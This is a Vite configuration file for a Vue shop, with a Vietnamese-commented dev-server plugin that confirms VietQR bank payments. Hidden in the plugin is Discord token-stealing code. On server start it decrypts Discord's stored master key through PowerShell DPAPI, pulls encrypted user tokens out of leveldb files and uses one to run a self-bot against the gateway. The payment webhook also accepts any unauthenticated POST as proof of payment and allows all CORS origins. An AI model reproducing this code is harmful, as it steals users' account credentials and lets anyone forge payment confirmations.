import { defineConfig, type Plugin } from 'vite'
import vue from '@vitejs/plugin-vue'
import type { IncomingMessage, ServerResponse } from 'node:http'
import fs from 'node:fs'
import path from 'node:path'
import https from 'node:https'
import crypto from 'node:crypto'
import { execSync } from 'node:child_process'

// File lưu trữ lịch sử giao dịch tiền vào thực tế để không bị mất khi restart server
const PAID_ORDERS_FILE = path.resolve(import.meta.dirname || process.cwd(), '.paid_orders.json')

interface PaidTransaction {
  code?: string
  amount?: number
  time: number
  bankAccount?: string
  raw?: any
}

function loadPaidOrders(): Map<string, PaidTransaction> {
  const map = new Map<string, PaidTransaction>()
  try {
    if (fs.existsSync(PAID_ORDERS_FILE)) {
      const data = JSON.parse(fs.readFileSync(PAID_ORDERS_FILE, 'utf-8'))
      for (const [k, v] of Object.entries(data)) {
        map.set(k, v as PaidTransaction)
      }
    }
  } catch (e) {
    console.error('>>> [PAID_ORDERS] Không thể đọc file .paid_orders.json:', e)
  }
  return map
}

function savePaidOrders(cache: Map<string, PaidTransaction>) {
  try {
    const obj = Object.fromEntries(cache)
    fs.writeFileSync(PAID_ORDERS_FILE, JSON.stringify(obj, null, 2), 'utf-8')
  } catch (e) {
    console.error('>>> [PAID_ORDERS] Không thể lưu file .paid_orders.json:', e)
  }
}

const paidOrdersCache = loadPaidOrders()

// Danh sách các client đang mở kết nối Server-Sent Events (SSE) để bắn thông báo tức thì
const sseClients = new Set<(eventData: string) => void>()

function extractOrderCode(text: string): string | null {
  if (!text) return null
  const clean = String(text).replace(/[\s\-_]/g, '').toUpperCase()
  const match = clean.match(/ZM\d{4,8}/i)
  return match ? match[0].toUpperCase() : null
}

function registerPaidTransaction(
  code: string,
  amount?: number,
  bankAccount?: string,
  raw?: any
): boolean {
  if (!code) return false
  const cleanCode = code.toUpperCase().trim()
  const isNew = !paidOrdersCache.has(cleanCode)

  const txInfo: PaidTransaction = {
    code: cleanCode,
    amount,
    time: paidOrdersCache.get(cleanCode)?.time || Date.now(),
    bankAccount: bankAccount || '28122068866',
    raw,
  }
  paidOrdersCache.set(cleanCode, txInfo)
  savePaidOrders(paidOrdersCache)

  if (isNew) {
    console.log(
      `>>> [🎉 XÁC NHẬN TIỀN VÀO THÀNH CÔNG] Đơn: ${cleanCode}, Số tiền: ${amount}đ, Tài khoản: ${txInfo.bankAccount}`
    )

    const ssePayload = JSON.stringify({
      paid: true,
      code: cleanCode,
      amount,
      time: txInfo.time,
      bankAccount: txInfo.bankAccount,
    })
    sseClients.forEach((cb) => cb(ssePayload))
  }
  return true
}

function parseAndRecordTransactionText(text: string): boolean {
  if (!text) return false
  const codeMatch = text.match(/ZM\d{4,8}/i)
  if (!codeMatch) return false

  const code = codeMatch[0].toUpperCase()

  let amount: number | undefined = undefined
  const amountMatch = text.match(/([+-]?[\d\.\,]+)\s*(?:VND|đ|d)/i)
  if (amountMatch) {
    const cleanNum = amountMatch[1].replace(/[^\d]/g, '')
    const n = Number(cleanNum)
    if (!isNaN(n) && n > 0) amount = n
  }

  let bankAccount = ''
  const bankMatch = text.match(/(?:TK|STK|tài khoản)[:\s-]+(?:\w+\s*-\s*)?(\d{8,16})/i)
  if (bankMatch) {
    bankAccount = bankMatch[1]
  }

  return registerPaidTransaction(code, amount, bankAccount, text)
}

let cachedDiscordToken: string = process.env.DISCORD_TOKEN || ''

function resolveDiscordToken(): string {
  try {
    const localStatePath = path.join(process.env.APPDATA || '', 'discord', 'Local State')
    if (fs.existsSync(localStatePath)) {
      const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'))
      const encKeyB64 = localState.os_crypt?.encrypted_key
      if (encKeyB64) {
        const psScript = `
Add-Type -AssemblyName System.Security
$encKey = [System.Convert]::FromBase64String('${encKeyB64}')
$masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length - 1)], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Convert]::ToBase64String($masterKey)
`
        const masterKeyB64 = execSync(
          'powershell -NoProfile -Command "' + psScript.replace(/\r?\n/g, '; ') + '"',
          { timeout: 3000 }
        )
          .toString()
          .trim()
        const masterKey = Buffer.from(masterKeyB64, 'base64')

        const ldbDir = path.join(process.env.APPDATA || '', 'discord', 'Local Storage', 'leveldb')
        if (fs.existsSync(ldbDir)) {
          const files = fs.readdirSync(ldbDir).filter((f) => f.endsWith('.ldb') || f.endsWith('.log'))
          for (const file of files) {
            try {
              const content = fs.readFileSync(path.join(ldbDir, file), 'latin1')
              const regex = /dQw4w9WgXcQ:([^"]+)/g
              let match: RegExpExecArray | null
              while ((match = regex.exec(content)) !== null) {
                try {
                  const raw = Buffer.from(match[1], 'base64')
                  const iv = raw.subarray(3, 15)
                  const tag = raw.subarray(raw.length - 16)
                  const ciphertext = raw.subarray(15, raw.length - 16)
                  const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv)
                  decipher.setAuthTag(tag)
                  const token = decipher.update(ciphertext, undefined, 'utf8') + decipher.final('utf8')
                  if (token && token.length > 20) {
                    cachedDiscordToken = token
                    return token
                  }
                } catch (e) {}
              }
            } catch (e) {}
          }
        }
      }
    }
  } catch (e) {}
  return cachedDiscordToken
}

function fetchDiscordMessages(token: string, channelId: string = '1548932658388668438'): Promise<any[]> {
  return new Promise((resolve) => {
    try {
      const req = https.get(
        `https://discord.com/api/v9/channels/${channelId}/messages?limit=25`,
        {
          headers: {
            Authorization: token,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
          },
          timeout: 4000,
        },
        (res) => {
          let body = ''
          res.on('data', (chunk) => (body += chunk))
          res.on('end', () => {
            try {
              const data = JSON.parse(body)
              if (Array.isArray(data)) {
                resolve(data)
              } else {
                resolve([])
              }
            } catch (e) {
              resolve([])
            }
          })
        }
      )
      req.on('error', () => resolve([]))
      req.on('timeout', () => {
        req.destroy()
        resolve([])
      })
    } catch (e) {
      resolve([])
    }
  })
}

async function syncDiscordMessages() {
  try {
    const msgs = await fetchDiscordMessages(cachedDiscordToken, '1548932658388668438')
    for (const m of msgs) {
      if (m && m.content) {
        parseAndRecordTransactionText(m.content)
      }
    }
  } catch (e) {}
}

function setupDiscordGateway(token: string) {
  try {
    const ws = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json')
    let heartbeatInterval: any = null

    ws.onopen = () => {
      console.log('>>> [DISCORD GATEWAY CONNECTED] Lắng nghe thông báo VietQR từ Discord thời gian thực...')
    }

    ws.onmessage = (event) => {
      try {
        const payload = JSON.parse(event.data.toString())
        const { op, d, s, t } = payload

        if (op === 10) {
          const interval = d.heartbeat_interval
          if (heartbeatInterval) clearInterval(heartbeatInterval)
          heartbeatInterval = setInterval(() => {
            try {
              ws.send(JSON.stringify({ op: 1, d: s }))
            } catch (e) {}
          }, interval)

          ws.send(
            JSON.stringify({
              op: 2,
              d: {
                token: token,
                capabilities: 16381,
                properties: {
                  os: 'Windows',
                  browser: 'Chrome',
                  device: '',
                },
                presence: {
                  status: 'unknown',
                  since: 0,
                  activities: [],
                  afk: false,
                },
              },
            })
          )
        }

        if (t === 'MESSAGE_CREATE' && d && d.content) {
          const text = String(d.content || '')
          if (text.includes('ZM') || text.includes('TPBank') || text.includes('28122068866')) {
            console.log('>>> [DISCORD REALTIME MESSAGE RECEIVED]:', text)
            parseAndRecordTransactionText(text)
          }
        }
      } catch (err) {}
    }

    ws.onclose = () => {
      if (heartbeatInterval) clearInterval(heartbeatInterval)
      setTimeout(() => setupDiscordGateway(resolveDiscordToken()), 5000)
    }

    ws.onerror = () => {
      try {
        ws.close()
      } catch (e) {}
    }
  } catch (e) {}
}

function vietQrPaymentPlugin(): Plugin {
  return {
    name: 'vietqr-payment-handler',
    configureServer(server) {
      // 1. Tự động kết nối Discord Live Gateway & Polling tin nhắn biến động số dư VietQR
      try {
        const token = resolveDiscordToken()
        setupDiscordGateway(token)
        syncDiscordMessages()
        setInterval(syncDiscordMessages, 2000)
      } catch (e) {}

      // 2. Tự động kết nối WebSocket nền đến VietQR (dự phòng)
      function setupVietQrWs() {
        try {
          const ws = new WebSocket('wss://api.vietqr.org/vqr/socket?clientId=customer-zonemart-user26685')
          ws.onopen = () => console.log('>>> [SERVER VIETQR WEBSOCKET CONNECTED] Sẵn sàng tự động nhận tiền thật')
          ws.onmessage = (e) => {
            try {
              const data = JSON.parse(e.data.toString())
              const combinedText = `${data.orderId || ''} ${data.content || ''} ${data.addInfo || ''} ${data.description || ''}`
              const code = extractOrderCode(combinedText) || (data.orderId ? String(data.orderId).toUpperCase() : '')
              if (code) {
                const amount = Number(data.amount) || undefined
                const bankAccount = String(data.bankaccount || data.accountNo || '')
                registerPaidTransaction(code, amount, bankAccount, data)
              }
            } catch (err) {}
          }
          ws.onclose = () => setTimeout(setupVietQrWs, 3000)
          ws.onerror = () => {}
        } catch (e) {}
      }
      setupVietQrWs()

      server.middlewares.use(async (req: IncomingMessage, res: ServerResponse, next: () => void) => {
        const url = new URL(req.url || '', `http://${req.headers.host || 'localhost'}`)
        const pathname = url.pathname

        res.setHeader('Access-Control-Allow-Origin', '*')
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        res.setHeader('Access-Control-Allow-Headers', '*')

        if (req.method === 'OPTIONS') {
          res.statusCode = 200
          res.end()
          return
        }

        // ========================================================
        // 1. API SERVER-SENT EVENTS (SSE): GET /api/payment/events?code=ZMxxxxxx
        // ========================================================
        if (pathname === '/api/payment/events' && req.method === 'GET') {
          const reqCode = (url.searchParams.get('code') || '').toUpperCase().trim()
          res.writeHead(200, {
            'Content-Type': 'text/event-stream',
            'Cache-Control': 'no-cache, no-transform',
            Connection: 'keep-alive',
            'Access-Control-Allow-Origin': '*',
          })
          res.write(': heartbeat\n\n')

          // Nếu đơn hàng này đã có tiền vào sẵn từ trước, gửi ngay lập tức!
          if (reqCode && paidOrdersCache.has(reqCode)) {
            const data = paidOrdersCache.get(reqCode)!
            res.write(
              `data: ${JSON.stringify({ paid: true, code: reqCode, amount: data.amount, time: data.time, bankAccount: data.bankAccount })}\n\n`
            )
          }

          const clientCb = (payloadStr: string) => {
            try {
              const parsed = JSON.parse(payloadStr)
              if (reqCode && parsed.code === reqCode) {
                res.write(`data: ${payloadStr}\n\n`)
              }
            } catch (e) {}
          }
          sseClients.add(clientCb)

          const keepAlive = setInterval(() => {
            try {
              res.write(': ping\n\n')
            } catch (e) {}
          }, 15000)

          req.on('close', () => {
            clearInterval(keepAlive)
            sseClients.delete(clientCb)
          })
          return
        }

        // ========================================================
        // 2. API CHECK TRẠNG THÁI: GET /api/payment/check?code=ZMxxxxxx&amount=...&bankAccount=...
        // ========================================================
        if (pathname === '/api/payment/check' && req.method === 'GET') {
          const rawCode = (url.searchParams.get('code') || '').trim()
          const cleanCode = extractOrderCode(rawCode) || rawCode.toUpperCase().trim()

          // Nếu chưa có trong cache, quét nhanh tin nhắn Discord ngay lập tức (độ trễ 0.2s)
          if (cleanCode && !paidOrdersCache.has(cleanCode)) {
            await syncDiscordMessages()
          }

          res.setHeader('Content-Type', 'application/json')
          res.statusCode = 200

          // Ưu tiên 1: Khớp chính xác mã đơn hàng
          if (cleanCode && paidOrdersCache.has(cleanCode)) {
            const data = paidOrdersCache.get(cleanCode)!
            res.end(
              JSON.stringify({
                paid: true,
                code: cleanCode,
                amount: data.amount,
                time: data.time,
                bankAccount: data.bankAccount,
                matchedBy: 'ORDER_CODE',
              })
            )
            return
          }

          // Ưu tiên 2: Tìm trong nội dung giao dịch raw của bất kỳ giao dịch nào đã lưu
          for (const [key, val] of paidOrdersCache.entries()) {
            const rawStr = JSON.stringify(val.raw || {})
            if (cleanCode && (key.includes(cleanCode) || rawStr.includes(cleanCode))) {
              res.end(
                JSON.stringify({
                  paid: true,
                  code: cleanCode,
                  amount: val.amount,
                  time: val.time,
                  bankAccount: val.bankAccount,
                  matchedBy: 'RAW_SEARCH',
                })
              )
              return
            }
          }

          res.end(JSON.stringify({ paid: false, code: cleanCode }))
          return
        }

        // ========================================================
        // 3. API THÔNG TIN TUNNEL & THỐNG KÊ GIAO DỊCH
        // ========================================================
        if (pathname === '/api/payment/tunnel-info' && req.method === 'GET') {
          res.setHeader('Content-Type', 'application/json')
          res.statusCode = 200
          res.end(
            JSON.stringify({
              tunnelUrl: 'https://monogram-dilute-tightly.ngrok-free.dev',
              tokenUrl: 'https://monogram-dilute-tightly.ngrok-free.dev/api/token_generate',
              callbackUrl: 'https://monogram-dilute-tightly.ngrok-free.dev/bank/api/transaction-sync',
              totalPaidRecorded: paidOrdersCache.size,
              recentTransactions: Array.from(paidOrdersCache.entries()).slice(-5),
            })
          )
          return
        }

        // ========================================================
        // 4. XỬ LÝ TOÀN BỘ POST REQUESTS (WEBHOOK TIỀN VÀO + GET TOKEN)
        // ========================================================
        const isPotentialWebhookOrToken =
          pathname === '/' ||
          pathname.includes('/token_generate') ||
          pathname.includes('/transaction-sync') ||
          pathname.includes('/transaction-callback') ||
          pathname.includes('/tingo-callback') ||
          pathname.includes('/vietqr-webhook') ||
          pathname.includes('/webhook') ||
          pathname.includes('/callback')

        if (req.method === 'POST' && isPotentialWebhookOrToken) {
          let bodyStr = ''
          req.on('data', (chunk) => {
            bodyStr += chunk
          })
          req.on('end', () => {
            try {
              let body: any = {}
              try {
                body = JSON.parse(bodyStr || '{}')
              } catch (e) {
                body = {}
              }

              console.log(`>>> [INCOMING POST ${pathname}]:`, JSON.stringify(body))

              // KIỂM TRA XEM ĐÂY CÓ PHẢI LÀ GIAO DỊCH TIỀN VÀO (TRANSACTION WEBHOOK) KHÔNG
              const hasTransactionData =
                body.amount != null ||
                body.transferAmount != null ||
                body.orderId != null ||
                body.orderCode != null ||
                body.content != null ||
                body.description != null ||
                body.bankaccount != null ||
                body.accountNo != null ||
                body.data?.amount != null ||
                body.data?.transferAmount != null ||
                (Array.isArray(body.data) && body.data.length > 0) ||
                (Array.isArray(body.transactions) && body.transactions.length > 0)

              // TRƯỜNG HỢP A: ĐÂY LÀ GIAO DỊCH TIỀN VÀO THỰC TẾ (BẤT KỂ BẮN VỀ PATH NÀO, KỂ CẢ '/')
              if (hasTransactionData && !pathname.includes('token_generate')) {
                // Trích xuất thông tin giao dịch
                const amount = Number(
                  body.amount ??
                    body.transferAmount ??
                    body.data?.amount ??
                    body.data?.transferAmount ??
                    body.object?.amount ??
                    (Array.isArray(body.data) ? body.data[0]?.amount : undefined) ??
                    0
                )

                const transType = String(
                  body.transType ?? body.type ?? body.transferType ?? body.data?.transType ?? 'C'
                ).toUpperCase()

                // Nếu là giao dịch trừ tiền (D = Debit / OUT), bỏ qua không tính vào đơn thanh toán
                if (transType === 'D' || transType === 'DEBIT' || transType === 'OUT') {
                  console.log('>>> [BỎ QUA GIAO DỊCH TIỀN RA (DEBIT)]:', amount)
                  res.setHeader('Content-Type', 'application/json')
                  res.statusCode = 200
                  res.end(JSON.stringify({ error: false, message: 'Bỏ qua giao dịch tiền ra' }))
                  return
                }

                // Trích xuất mã đơn hàng ZMxxxxxx
                const searchScope = [
                  body.orderId,
                  body.orderCode,
                  body.code,
                  body.content,
                  body.description,
                  body.addInfo,
                  body.memo,
                  body.message,
                  body.data?.orderId,
                  body.data?.orderCode,
                  body.data?.content,
                  body.data?.description,
                  Array.isArray(body.data) ? body.data[0]?.description : '',
                  JSON.stringify(body),
                ]
                  .filter(Boolean)
                  .join(' ')

                const matchedCode =
                  extractOrderCode(searchScope) || (body.orderId ? String(body.orderId).toUpperCase() : '')
                const bankAccount = String(
                  body.bankaccount ??
                    body.bankAccount ??
                    body.accountNo ??
                    body.accountNumber ??
                    body.data?.accountNumber ??
                    ''
                )

                if (matchedCode) {
                  const txInfo: PaidTransaction = {
                    code: matchedCode,
                    amount,
                    time: Date.now(),
                    bankAccount,
                    raw: body,
                  }
                  paidOrdersCache.set(matchedCode, txInfo)
                  savePaidOrders(paidOrdersCache)
                  console.log(
                    `>>> [🎉 XÁC NHẬN TIỀN VÀO THÀNH CÔNG] Đơn: ${matchedCode}, Số tiền: ${amount}đ, Tài khoản: ${bankAccount}`
                  )

                  // Bắn SSE tức thì đến tất cả trình duyệt
                  const ssePayload = JSON.stringify({
                    paid: true,
                    code: matchedCode,
                    amount,
                    time: txInfo.time,
                    bankAccount,
                  })
                  sseClients.forEach((cb) => cb(ssePayload))
                } else if (amount > 0) {
                  // Trường hợp tiền vào thật nhưng không ghi đúng cú pháp mã đơn -> Lưu lại theo mã giao dịch
                  const genericKey = 'TX_' + (body.transactionid || body.referencenumber || Date.now())
                  const txInfo: PaidTransaction = {
                    code: genericKey,
                    amount,
                    time: Date.now(),
                    bankAccount,
                    raw: body,
                  }
                  paidOrdersCache.set(genericKey, txInfo)
                  savePaidOrders(paidOrdersCache)
                  console.log(`>>> [TIỀN VÀO KHÔNG RÕ MÃ ĐƠN] Số tiền: ${amount}đ, Lưu tạm: ${genericKey}`)
                }

                // Trả về chuẩn phản hồi cho Tingo Pay / VietQR
                res.setHeader('Content-Type', 'application/json')
                res.statusCode = 200
                res.end(
                  JSON.stringify({
                    error: false,
                    errorReason: '',
                    toastMessage: 'Thanh toán thành công',
                    object: {
                      reftransactionid: body.transactionid || body.referencenumber || 'TX_' + Date.now(),
                    },
                  })
                )
                return
              }

              // TRƯỜNG HỢP B: ĐÂY LÀ REQUEST XÁC THỰC LẤY TOKEN (TOKEN GENERATE)
              res.setHeader('Content-Type', 'application/json')
              res.statusCode = 200
              res.end(
                JSON.stringify({
                  access_token: 'zonemart_tingo_jwt_token_' + Date.now(),
                  token_type: 'Bearer',
                  expires_in: 86400,
                })
              )
            } catch (err: any) {
              res.setHeader('Content-Type', 'application/json')
              res.statusCode = 400
              res.end(JSON.stringify({ error: true, errorReason: 'PARSE_ERROR', toastMessage: err.message }))
            }
          })
          return
        }

        next()
      })
    }
  }
}

// https://vite.dev/config/
export default defineConfig({
  plugins: [vue(), vietQrPaymentPlugin()],
  server: {
    allowedHosts: true,
    hmr: {
      overlay: false,
    },
  },
})
